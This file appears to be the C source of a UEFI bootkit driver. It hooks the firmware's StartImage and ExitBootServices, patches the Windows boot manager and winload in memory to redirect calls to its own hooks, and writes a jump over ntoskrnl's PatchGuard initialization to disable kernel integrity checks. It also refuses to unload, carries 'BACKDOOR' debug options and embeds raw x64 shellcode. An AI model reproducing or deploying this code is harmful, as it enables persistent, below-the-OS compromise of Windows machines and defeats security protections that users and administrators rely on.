#pragma warning(disable: 4996)

#include <Library/DevicePathLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/BaseLib.h>
#include <Protocol/SerialIo.h>
#include <Base.h>

#include "drv.h"
#include "asm.h"
#include "arc.h"
#include "utils.h"
#include "types.h"
#include "debug.h"
#include "bootloader.h"
#include "globals.h"
#include "serial.h"

EFI_HANDLE	gImageHandle;
EFI_SYSTEM_TABLE	*gSystemTable;
EFI_BOOT_SERVICES	*gBootServices;
EFI_RUNTIME_SERVICES	*gRuntimeServices;

#define PAGE_SIZE 0x1000
//
// We support unload (but deny it)
//
const UINT8 _gDriverUnloadImageCount = 1;

//
// We require at least UEFI 2.0
//
const UINT32 _gUefiDriverRevision = 0x200;
const UINT32 _gDxeRevision = 0x200;

//
// Our name
//
CHAR8 *gEfiCallerBaseName = "UefiDriver";

//EFI_LOADED_IMAGE_PROTOCOL *gLoadedImageProtocol;
EFI_EXIT_BOOT_SERVICES g_pOrgExitBootService = NULL;
EFI_IMAGE_LOAD g_pImageLoad = NULL;
EFI_IMAGE_START g_pImageStart = NULL;

void *Base = NULL;
EFI_IMAGE_NT_HEADERS *pHeaders = NULL;
PLOADER_PARAMETER_BLOCK blk;

EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL;
char *m_PendingOutput = NULL;
EFI_SERIAL_IO_PROTOCOL *m_SerialIo = NULL;

void SerialPrint(char *Message);

PLOADER_PARAMETER_BLOCK my;

BOOLEAN ConsoleInit(void)
{
	if (m_PendingOutput == NULL)
	{
		EFI_PHYSICAL_ADDRESS PagesAddr;

		// allocate memory for pending debug output
		EFI_STATUS Status = gBS->AllocatePages(
			AllocateAnyPages,
			EfiRuntimeServicesData,
			1, &PagesAddr
		);
		if (EFI_ERROR(Status))
		{
			DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
			return FALSE;
		}

		m_PendingOutput = (char *)PagesAddr;
		gBS->SetMem(m_PendingOutput, PAGE_SIZE, 0);
	}

	return TRUE;
}
//--------------------------------------------------------------------------------------
void SerialPrint(char *Message)
{
	UINTN Len = AsciiStrLen(Message), i = 0;

	Print(L"len %lx", Len);
	AsciiPrint(Message);

#if defined(BACKDOOR_DEBUG_SERIAL_PROTOCOL)

	if (m_SerialIo)
	{
		m_SerialIo->Write(m_SerialIo, &Len, Message);
	}

#elif defined(BACKDOOR_DEBUG_SERIAL_BUILTIN)

	SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

	for (i = 0; i < Len; i += 1)
	{
		// send single byte via serial port
		SerialPortWrite(SERIAL_PORT_NUM, Message[i]);
	}

#elif defined(BACKDOOR_DEBUG_SERIAL_OVMF)

	for (i = 0; i < Len; i += 1)
	{
		// send single byte to OVMF debug port
		__outbyte(OVMF_DEBUG_PORT, Message[i]);
	}

#endif

#if defined(BACKDOOR_DEBUG_SERIAL_TO_CONSOLE)

	if (m_TextOutput == NULL)
	{
		if (m_PendingOutput &&
			strlen(m_PendingOutput) + strlen(Message) < PAGE_SIZE)
		{
			// text output protocol is not initialized yet, save output to temp buffer
			strcat(m_PendingOutput, Message);
		}
	}
	else
	{
		ConsolePrint(Message);
	}

#endif

}
//--------------------------------------------------------------------------------------
BOOLEAN SerialInit(VOID)
{

#if defined(BACKDOOR_DEBUG_SERIAL_PROTOCOL)

	if (m_SerialIo)
	{
		// serial I/O is already initialized
		return TRUE;
	}

	// TODO: initialize EFI serial I/O protocol
	// ...

	if (m_SerialIo == NULL)
	{
		return FALSE;
	}

#elif defined(BACKDOOR_DEBUG_SERIAL_BUILTIN)

	SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

#endif

	return TRUE;
}

PKLDR_DATA_TABLE_ENTRY GetLoadedModule(LIST_ENTRY* LoadOrderListHead, CHAR16* ModuleName)
{
	if (ModuleName == NULL || LoadOrderListHead == NULL)
		return NULL;

	for (LIST_ENTRY* ListEntry = LoadOrderListHead->ForwardLink; ListEntry != LoadOrderListHead; ListEntry = ListEntry->ForwardLink)
	{
		PKLDR_DATA_TABLE_ENTRY Entry = CONTAINING_RECORD(ListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		if (Entry && (StrnCmp(Entry->BaseImageName.Buffer, ModuleName, Entry->BaseImageName.Length) == 0))
			return Entry;
	}

	return NULL;
}


EFI_STATUS
EFIAPI
UefiUnload (
    IN EFI_HANDLE ImageHandle
    )
{
    //
    // Do not allow unload
    //
    return EFI_ACCESS_DENIED;
}


UINT8 * UtilFindPattern2(VOID* Based, UINT32 Size, const unsigned char* pattern, const char* mask)
{
	UINT32 pos = 0;
	UINT32 maskLength = sizeof(mask) - 1;
	
	for(UINT32 i = 0; i < Size-maskLength ; i += 1)
	{
		UINT8 *Code = RVATOVA(Based, i);

		if (*(Code) == pattern[pos] || mask[pos] == '?')
		{
			if (mask[pos + 1] == '\0')
			{
				Print(L"FOund!\r\n");
				return Code;
			}
			//if(*(Code) == pattern[pos])
			//	Print(L"\r\nFOUND SINGLE %lx \r\n", *(Code));
			pos++;
		}
		else
		{
			pos = 0;
			//Print(L"%lx", *(Code));
		}
	}

	return NULL;
}

VOID
EFIAPI
InitializeLib(
	IN EFI_HANDLE			ImageHandle,
	IN EFI_SYSTEM_TABLE	*SystemTable
)
{
	gImageHandle = ImageHandle;
	gSystemTable = SystemTable;
	gBootServices = gSystemTable->BootServices;
	gRuntimeServices = gSystemTable->RuntimeServices;
	gBS = gBootServices;
	gST = gSystemTable;
	gRT = gRuntimeServices;
}


VOID
EFIAPI
CallbackSMI(
	IN  EFI_EVENT	Event,
	IN  VOID      *Context
)
{
	//CHAR8 *dest = NULL;
	//UnicodeStrToAsciiStr(b.Extension->SmbiosVersion.Buffer, dest);
	
	//AsciiPrint("%s\r\n", dest);

	unsigned char messageBox64bit_sc[] = {
		0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x65, 0x4c, 0x8b, 0x24,
		0x25, 0x60, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x64, 0x24, 0x18, 0x4d, 0x8b,
		0x64, 0x24, 0x20, 0x4d, 0x8b, 0x24, 0x24, 0x4d, 0x8b, 0x7c, 0x24, 0x20,
		0x4d, 0x8b, 0x24, 0x24, 0x4d, 0x8b, 0x64, 0x24, 0x20, 0xba, 0x8e, 0x4e,
		0x0e, 0xec, 0x4c, 0x89, 0xe1, 0xe8, 0x68, 0x00, 0x00, 0x00, 0xeb, 0x34,
		0x59, 0xff, 0xd0, 0xba, 0xa8, 0xa2, 0x4d, 0xbc, 0x48, 0x89, 0xc1, 0xe8,
		0x56, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc3, 0x4d, 0x31, 0xc9, 0xeb, 0x2c,
		0x41, 0x58, 0xeb, 0x3a, 0x5a, 0x48, 0x31, 0xc9, 0xff, 0xd3, 0xba, 0x70,
		0xcd, 0x3f, 0x2d, 0x4c, 0x89, 0xf9, 0xe8, 0x37, 0x00, 0x00, 0x00, 0x48,
		0x31, 0xc9, 0xff, 0xd0, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x75, 0x73, 0x65,
		0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0xe8, 0xcf, 0xff, 0xff,
		0xff, 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x66, 0x75, 0x6e,
		0x21, 0x00, 0xe8, 0xc1, 0xff, 0xff, 0xff, 0x30, 0x78, 0x64, 0x65, 0x61,
		0x64, 0x62, 0x65, 0x65, 0x66, 0x00, 0x49, 0x89, 0xcd, 0x67, 0x41, 0x8b,
		0x45, 0x3c, 0x67, 0x45, 0x8b, 0xb4, 0x05, 0x88, 0x00, 0x00, 0x00, 0x45,
		0x01, 0xee, 0x67, 0x45, 0x8b, 0x56, 0x18, 0x67, 0x41, 0x8b, 0x5e, 0x20,
		0x44, 0x01, 0xeb, 0x67, 0xe3, 0x3f, 0x41, 0xff, 0xca, 0x67, 0x42, 0x8b,
		0x34, 0x93, 0x44, 0x01, 0xee, 0x31, 0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84,
		0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x39, 0xd7,
		0x75, 0xdd, 0x67, 0x41, 0x8b, 0x5e, 0x24, 0x44, 0x01, 0xeb, 0x31, 0xc9,
		0x66, 0x67, 0x42, 0x8b, 0x0c, 0x53, 0x67, 0x41, 0x8b, 0x5e, 0x1c, 0x44,
		0x01, 0xeb, 0x67, 0x8b, 0x04, 0x8b, 0x44, 0x01, 0xe8, 0xc3
	};

	gBS->AllocatePool(EfiRuntimeServicesCode, sizeof(messageBox64bit_sc), (VOID**)&messageBox64bit_sc);
}

VOID EFIAPI hkOslArchTransferToKernel(PLOADER_PARAMETER_BLOCK KernelParams, VOID *KiSystemStartup)
{
	//
	// Before we do anything, restore original call bytes
	//

	__debugbreak();
	
	*(UINT32*)(OslArchTransferToKernelCallPatchLocation + 1) = *(UINT32*)(OslArchTransferToKernelCallBackup + 1);


	//CopyMem(&b, KernelParams, sizeof(LOADER_PARAMETER_BLOCK));

	PKLDR_DATA_TABLE_ENTRY KernelEntry = NULL;
	VOID* KernelBase = NULL;
	UINT32 KernelSize = 0;

	KernelEntry = GetLoadedModule(&KernelParams->LoadOrderListHead, L"ntoskrnl.exe");
	if (KernelEntry)
	{
		KernelBase = KernelEntry->ImageBase;
		KernelSize = KernelEntry->SizeOfImage;
	}

	if (KernelBase && KernelSize)
	{
		//
		// Find patch guard initialization function
		//
		UINT8* Found = NULL;
		EFI_STATUS Status = UtilFindPattern(sigInitPatchGuard, 0xCC, sizeof(sigInitPatchGuard), KernelBase, KernelSize, (VOID**)&Found);
		if (Status == EFI_SUCCESS)
		{
			InitPatchGuardPatchLocation = (VOID*)Found;
			//
			// Patch to force a jump to skip PG initialization
			//
			*(UINT8*)Found = 0xEB;
		}
	}
	
	//Print(L"z");

	//KernelParams->RegistryBase = (VOID*)0x10000;

	oOslArchTransferToKernel(KernelParams, KiSystemStartup);
}

VOID EFIAPI hkOslFwpKernelSetupPhase1(PLOADER_PARAMETER_BLOCK a1)
{
	*(UINT32*)(OslFwpKernelSetupPhase1PatchLocation + 1) = *(UINT32*)(OslFwpKernelSetupPhase1Backup + 1);

	oOslFwpKernelSetupPhase1(a1);

	my = a1;

	//__debugbreak();
}

CHAR16 *
EFIAPI
FileDevicePathToText(EFI_DEVICE_PATH_PROTOCOL *FilePathProto)
{
	EFI_STATUS					Status;
	FILEPATH_DEVICE_PATH 				*FilePath;
	CHAR16								FilePathText[256]; // possible problem: if filepath is bigger
	CHAR16								*OutFilePathText;
	UINTN								Size;
	UINTN								SizeAll;
	UINTN								i;

	FilePathText[0] = L'\0';
	i = 4;
	SizeAll = 0;
	//DBG("FilePathProto->Type: %d, SubType: %d, Length: %d\n", FilePathProto->Type, FilePathProto->SubType, DevicePathNodeLength(FilePathProto));
	while (FilePathProto != NULL && FilePathProto->Type != END_DEVICE_PATH_TYPE && i > 0) {
		if (FilePathProto->Type == MEDIA_DEVICE_PATH && FilePathProto->SubType == MEDIA_FILEPATH_DP) {
			FilePath = (FILEPATH_DEVICE_PATH *)FilePathProto;
			Size = (DevicePathNodeLength(FilePathProto) - 4) / 2;
			if (SizeAll + Size < 256) {
				if (SizeAll > 0 && FilePathText[SizeAll / 2 - 2] != L'\\') {
					StrCat(FilePathText, L"\\");
				}
				StrCat(FilePathText, FilePath->PathName);
				SizeAll = StrSize(FilePathText);
			}
		}
		FilePathProto = NextDevicePathNode(FilePathProto);
		//DBG("FilePathProto->Type: %d, SubType: %d, Length: %d\n", FilePathProto->Type, FilePathProto->SubType, DevicePathNodeLength(FilePathProto));
		i--;
		//DBG("FilePathText: %s\n", FilePathText);
	}

	OutFilePathText = NULL;
	Size = StrSize(FilePathText);
	if (Size > 2) {
		// we are allocating mem here - should be released by caller
		Status = gBS->AllocatePool(EfiBootServicesData, Size, (VOID*)&OutFilePathText);
		if (Status == EFI_SUCCESS) {
			StrCpy(OutFilePathText, FilePathText);
		}
		else {
			OutFilePathText = NULL;
		}
	}

	return OutFilePathText;
}
//typedef EFI_STATUS(EFIAPI *tImgArchEfiStartBootApplication)(PBL_APPLICATION_ENTRY AppEntry, VOID* ImageBase, UINT32 ImageSize, UINT8 BootOption, PBL_RETURN_ARGUMENTS ReturnArguments);


/*EFI_STATUS EFIAPI hkImgArchEfiStartBootApplication(PBL_APPLICATION_ENTRY AppEntry, VOID* ImageBase, UINT32 ImageSize, UINT8 BootOption, PBL_RETURN_ARGUMENTS ReturnArguments)
{
	//PIMAGE_NT_HEADERS NtHdr = NULL;

	// Restore original bytes to call
	CopyMem(ImgArchEfiStartBootApplicationPatchLocation, ImgArchEfiStartBootApplicationBackup, 5);

	// Clear the screen
	//gST->ConOut->ClearScreen(gST->ConOut);

	//NtHdr = ImageNtHeader(ImageBase);
	//if (NtHdr != NULL)
	{
		EFI_STATUS EfiStatus = EFI_SUCCESS;
		UINT8* Found = NULL;

		// Find right location to patch
		EfiStatus = UtilFindPattern(sigOslArchTransferToKernelCall, 0xCC, sizeof(sigOslArchTransferToKernelCall), ImageBase, ImageSize, (VOID**)&Found);
		if (EfiStatus == EFI_SUCCESS)
		{
			Print(L"Found OslArchTransferToKernel call at %lx\r\n", Found);

			// Get original from call instruction
			oOslArchTransferToKernel = (tOslArchTransferToKernel)UtilCallAddress(Found);
			Print(L"OslArchTransferToKernel at %lx\r\n", oOslArchTransferToKernel);
			Print(L"OslArchTransferToKernelHook at %lx\r\n", &hkOslArchTransferToKernel);

			// Backup original function bytes before patching
			OslArchTransferToKernelCallPatchLocation = (VOID*)Found;
			CopyMem((VOID*)OslArchTransferToKernelCallBackup, (VOID*)Found, 5);

			// display original code
			//Print(L"Original:\r\n");
			//UtilDisassembleCode((UINT8*)Found, (VOID*)Found, 5);

			// Do patching 
			*(UINT8*)Found = 0xE8;
			*(UINT32*)(Found + 1) = UtilCalcRelativeCallOffset((VOID*)Found, (VOID*)&hkOslArchTransferToKernel);

			// Display patched code 
			//Print(L"Patched:\r\n");
			//UtilDisassembleCode((UINT8*)Found, (VOID*)Found, 5);
		}
		else
		{
			Print(L"\r\nImgArchEfiStartBootApplication error, failed to find OslArchTransferToKernel patch location. Status: %lx\r\n", EfiStatus);
		}
	}

	//UtilPrintLoadedImageInfo(gLocalImageInfo);

	Print(L"Press any key to continue...");
	UtilWaitForKey();

	// Clear screen
	//gST->ConOut->ClearScreen(gST->ConOut);

	return oImgArchEfiStartBootApplication(AppEntry, ImageBase, ImageSize, BootOption, ReturnArguments);
}*/

__int64 hkRtlImageNtHeaderEx(int a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 *a4)
{
	*(UINT32*)(ImgArchEfiStartBootApplicationPatchLocation + 1) = *(UINT32*)(ImgArchEfiStartBootApplicationBackup + 1);

	Print(L"base %lx\r\n", a2);
	Print(L"size %lx\r\n", a3);

	UINT8* Found = NULL;;

	/*for (int i = 0; i < 5; i++)
	{
		UINT8 *Code = (UINT8*)(ImgArchEfiStartBootApplicationPatchLocation + i);

		Print(L"printing restored: %lx\r\n", *(Code));
	}*/

	EFI_STATUS EfiStatus = UtilFindPattern(sigOslArchTransferToKernelCall, 0xCC, sizeof(sigOslArchTransferToKernelCall), (VOID*)a2, (UINT32)a3, (VOID**)&Found);
	if (EfiStatus == EFI_SUCCESS)
	{
		Print(L"Found OslArchTransferToKernel call at %lx\r\n", Found);

		// Get original from call instruction
		//UINT8 sigTrans[] = { 0x33, 0xF6, 0x4C, 0x8B, 0xE1 };
		//UINT8* transFound = NULL;
		//UtilFindPattern(sigTrans, 0xCC, sizeof(sigTrans), (VOID*)a2, (UINT32)a3, (VOID**)&transFound);
		oOslArchTransferToKernel = (tOslArchTransferToKernel)UtilCallAddress(Found);

		Print(L"final addr: %lx\r\n", oOslArchTransferToKernel);
		//DbgMsg(__FILE__, __LINE__, "here\r\n");

		OslArchTransferToKernelCallPatchLocation = (VOID*)Found;
		//OslArchTransferToKernelCallPatchLocation = (VOID*)Found;
		CopyMem((VOID*)OslArchTransferToKernelCallBackup, (VOID*)Found, 5);

		// Do patching 
		*(UINT8*)Found = 0xE8;
		*(UINT32*)(Found + 1) = UtilCalcRelativeCallOffset((VOID*)Found, (VOID*)&hkOslArchTransferToKernel);

		UINT8* FoundSetup = NULL;
		EfiStatus = UtilFindPattern(sigOslFwpKernelSetupPhase1, 0xCC, sizeof(sigOslFwpKernelSetupPhase1), (VOID*)a2, (UINT32)a3, (VOID**)&FoundSetup);
		
		if (EfiStatus == EFI_SUCCESS)
		{
			oOslFwpKernelSetupPhase1 = (tOslFwpKernelSetupPhase1)UtilCallAddress(FoundSetup);
			OslFwpKernelSetupPhase1PatchLocation = (VOID*)FoundSetup;
			CopyMem((VOID*)OslFwpKernelSetupPhase1Backup, (VOID*)FoundSetup, 5);

			// Do patching 
			*(UINT8*)FoundSetup = 0xE8;
			*(UINT32*)(FoundSetup + 1) = UtilCalcRelativeCallOffset((VOID*)FoundSetup, (VOID*)&hkOslFwpKernelSetupPhase1);
		}
		else
		{
			Print(L"Failed to find it\r\n");
			UtilWaitForKey();
		}
		//SerialPrint("penis penis penis");

		/*UINT8 sigPrint[] = { 0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x4B, 0x08, 0x49, 0x89, 0x53, 0x10, 0x4D, 0x89, 0x43, 0x18, 0x4D, 0x89, 0x4B, 0x20, 0x48, 0x83, 0xEC, 0x38 };
		UINT8* FoundPrint = NULL;
		EFI_STATUS findPrint = UtilFindPattern(sigPrint, 0xCC, sizeof(sigPrint), (VOID*)a2, (UINT32)a3, (VOID**)&FoundPrint);

		if (findPrint == EFI_SUCCESS)
		{
			oDbgPrint = (tDbgPrint)(FoundPrint);
			oDbgPrint("testing123\r\b");
		}*/

	}
	else
	{
		Print(L"\r\nImgArchEfiStartBootApplication error, failed to find OslArchTransferToKernel patch location. Status: %lx\r\n", EfiStatus);
	}

	//Print(L"call address aga9n %lx\r\n", oRtlImageNtHeaderEx);

	return oRtlImageNtHeaderEx(a1, a2, a3, a4);
}

EFI_STATUS
hkImageStart(
	IN  EFI_HANDLE                  ImageHandle,
	OUT UINTN                       *ExitDataSize,
	OUT CHAR16                      **ExitData    OPTIONAL
)
{

	gBS->StartImage = g_pImageStart;

	Print(L"In image start\r\n");
	EFI_STATUS				Status;
	EFI_LOADED_IMAGE_PROTOCOL		*Image;
	CHAR16					*FilePathText = NULL;
	//	CHAR16					*BootLoaders[] = BOOT_LOADERS;
//	UINTN					Index;

	Print(L"->StartImage(0x%lx, , )\n", ImageHandle);

	//
	// Get gEfiLoadedImageProtocolGuid for image that is starting
	//
	Status = gBS->OpenProtocol(
		ImageHandle,
		&gEfiLoadedImageProtocolGuid,
		(VOID **)&Image,
		gImageHandle,
		NULL,
		EFI_OPEN_PROTOCOL_GET_PROTOCOL
	);
	if (Status != EFI_SUCCESS) {
		Print(L"ERROR: OStartImage: OpenProtocol(gEfiLoadedImageProtocolGuid) = %r\n", Status);
		return EFI_INVALID_PARAMETER;
	}

	//
	// Extract file path from image device file path
	//
	FilePathText = FileDevicePathToText(Image->FilePath);
	if (FilePathText == NULL) {
		Print(L"ERROR: OStartImage: image file path is NULL\n");
		return EFI_INVALID_PARAMETER;
	}
	Print(L" File: %s\n", FilePathText);
	Print(L" Image: %p - %x (%x)\n", Image->ImageBase, (UINTN)Image->ImageBase + Image->ImageSize, Image->ImageSize);
	//UtilWaitForKey();
	Status = gBS->CloseProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, gImageHandle, NULL);
	if (EFI_ERROR(Status)) {
		Print(L"CloseProtocol error: %r\n", Status);
	}
	
	UINT8* Found = NULL;
	EFI_STATUS EfiStatus = UtilFindPattern(
		sigRtl,
		0xCC,
		sizeof(sigRtl),
		Image->ImageBase,
		(UINT32)Image->ImageSize,
		(VOID**)&Found);
	
	if (!EFI_ERROR(EfiStatus))
	{
		// Found address, now let's do our patching
		UINT32 NewCallRelative = 0;

		Print(L"Found ImgArchEfiStartBootApplication call at %lx\n", Found);

		// Save original call

		UINT8 *orig = NULL;
		UINT8 origSig[] = { 0x45, 0x33, 0xD2, 0x4D, 0x8B, 0xD8 };
		UtilFindPattern(origSig, 0xCC, sizeof(origSig), Image->ImageBase, (UINT32)Image->ImageSize, (VOID**)&orig);
		oRtlImageNtHeaderEx = (tRtlImageNtHeaderEx)(orig);

		Print(L"call address %lx\r\n", oRtlImageNtHeaderEx);
		
		// Backup original bytes and patch location before patching
		ImgArchEfiStartBootApplicationPatchLocation = (VOID*)Found;

		Print(L"Original address %lx\r\n", ImgArchEfiStartBootApplicationPatchLocation);
		CopyMem(ImgArchEfiStartBootApplicationBackup, ImgArchEfiStartBootApplicationPatchLocation, 5);
		// Patch call to jump to our hkImgArchEfiStartBootApplication hook
		NewCallRelative = UtilCalcRelativeCallOffset((VOID*)Found, (VOID*)&hkRtlImageNtHeaderEx);
		Print(L"offset %lx\r\n", NewCallRelative);
	
		*(UINT8*)Found = 0xE8; // Write call opcode
		*(UINT32*)(Found + 1) = NewCallRelative; // Write the new relative call offset
	}
	else
	{
		Print(L"\r\nPatchWindowsBootManager error, failed to find Archpx64TransferTo64BitApplicationAsm patch location. Status: %lx\r\n", EfiStatus);
	}

	//UtilWaitForKey();
	//
	// Start image by calling original StartImage
	//
	FreePool(FilePathText);
	Status = g_pImageStart(ImageHandle, ExitDataSize, ExitData);
	
	return Status;
}

EFI_STATUS EFIAPI hkExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
{
	Print(L"exit boot %llx\r\n", my);
	UINTN i = 0;

	// return address points to winload
	VOID *Addr = (VOID *)((UINTN)ret_ExitBootServices & 0xfffffffffffff000);

	char bFoundBase = 0;

	// determinate winload.efi base address
	while (i < PAGE_SIZE * 0x20)
	{
		if (*(UINT16 *)Addr == EFI_IMAGE_DOS_SIGNATURE)
		{
			Base = Addr;
			break;
		}

		Addr = (VOID *)((UINTN)Addr - PAGE_SIZE);
		i += PAGE_SIZE;
	}

	if (Base != NULL)
	{
		Print(L"\n\r%X\n\r", Base);
		bFoundBase = 1;
	}
	
	if (bFoundBase)
	{
		//UINT8* Found = NULL;
		
		//void *origBase = Base;
		pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Base, ((EFI_IMAGE_DOS_HEADER *)Base)->e_lfanew);

		//48 8B 3D ? ? ? ? 48 8B CF

		UINT8 sigBlock[] = { 0x48, 0x8B, 0x3D, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xCF };
		UINT8* blkAddr = NULL;
		
		EFI_STATUS FindBlk = UtilFindPattern(sigBlock, 0xCC, sizeof(sigBlock), Base, pHeaders->OptionalHeader.SizeOfImage, (VOID**)&blkAddr);

		if (FindBlk == EFI_SUCCESS)
		{
			const UINT32 offset = *(UINT32*)(blkAddr + 3);

			PLOADER_PARAMETER_BLOCK PBlock = (PLOADER_PARAMETER_BLOCK)(blkAddr + 7 + offset);

			Print(L"LOADER_PARAMETER_BLOCK @ %llx\r\n", PBlock);

			//LOADER_PARAMETER_BLOCK blk123 = *PBlock;
	
			Print(L"Major Version: %lu\r\n", PBlock->OsMajorVersion);
			UtilWaitForKey();

			//Print(L"Found blk call at %lx\r\n", *(UINT32*)(Found2 + 3));
			//PLOADER_PARAMETER_BLOCK blk2 = NULL;
			//blk2 = (PLOADER_PARAMETER_BLOCK)&ldrblk;
			
			/*Print(L"%s\r\n", blk2->NtBootPathName);

			Print(L"%s\r\n", blk2->Extension->EfiVersion.Buffer);
			Print(L"%lx\r\n", blk2->OsMajorVersion);
			Print(L"%lx\r\n", blk2->RegistryLength);
			&/
			/*PKLDR_DATA_TABLE_ENTRY KernelEntry = GetLoadedModule(&blk2->LoadOrderListHead, L"ntoskrnl.exe");
			if (KernelEntry)
			{
				Print(L"got it %lx", KernelEntry->DllBase);
				//KernelBase = KernelEntry->ImageBase;
				Print(L"Size %lx\r\n", KernelEntry->SizeOfImage);
				//KernelSize = KernelEntry->SizeOfImage;
			}*/
			
			
		}
		
		//\x48\x8B\x3D\x00\x00\x00\x00\x48\x8B\xCF xxx????xxx
		
	}

	gBS->ExitBootServices = g_pOrgExitBootService;
	
	return g_pOrgExitBootService(ImageHandle, MapKey);
}

EFI_STATUS RegisterProtocolNotifyDxe(
	EFI_GUID *Guid, EFI_EVENT_NOTIFY Handler,
	EFI_EVENT *Event, PVOID *Registration)
{
	EFI_STATUS Status = gBS->CreateEvent(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, Handler, NULL, Event);
	if (EFI_ERROR(Status))
	{
		//DbgMsg(__FILE__, __LINE__, "CreateEvent() fails: 0x%X\r\n", Status);
		return Status;
	}

	Status = gBS->RegisterProtocolNotify(Guid, *Event, (PVOID)Registration);
	if (EFI_ERROR(Status))
	{
		//DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() fails: 0x%X\r\n", Status);
		return Status;
	}

	//DbgMsg(__FILE__, __LINE__, "Protocol notify handler is at "FPTR"\r\n", Handler);

	return Status;
}



EFI_STATUS
EFIAPI
UefiMain (
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
    )
{
    EFI_STATUS efiStatus;

	InitializeLib(ImageHandle, SystemTable);

	SerialInit();

	


    efiStatus = EfiLibInstallDriverBindingComponentName2(ImageHandle,
                                                         SystemTable,
                                                         &gDriverBindingProtocol,
                                                         ImageHandle,
                                                         &gComponentNameProtocol,
                                                         &gComponentName2Protocol);

	/*EFI_EVENT Event;
	PVOID Registration = NULL;

	RegisterProtocolNotifyDxe(
		&gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler,
		&Event, &Registration
	);*/

	EFI_EVENT Event;
	gBootServices->CreateEventEx(0x200, 0x10, &CallbackSMI, NULL, &EXIT_BOOT_SERVICES_GUID, &Event);
	//gBootServices->CreateEventEx(0x200, 0x10, &Callback2, NULL, &SMBIOS_TABLE_GUID, &Event);
	//gBootServices->CreateEventEx(0x200, 0x10, &Callback2, NULL, &CC, &Event);
	
	g_pOrgExitBootService = gBS->ExitBootServices;
	gBS->ExitBootServices = _ExitBootServices;

	g_pImageStart = gBS->StartImage;
	gBS->StartImage = hkImageStart;

	gBS->Hdr.CRC32 = 0;
	gBS->CalculateCrc32(gBS, gBS->Hdr.HeaderSize, &gBS->Hdr.CRC32);

	

    return efiStatus;
}

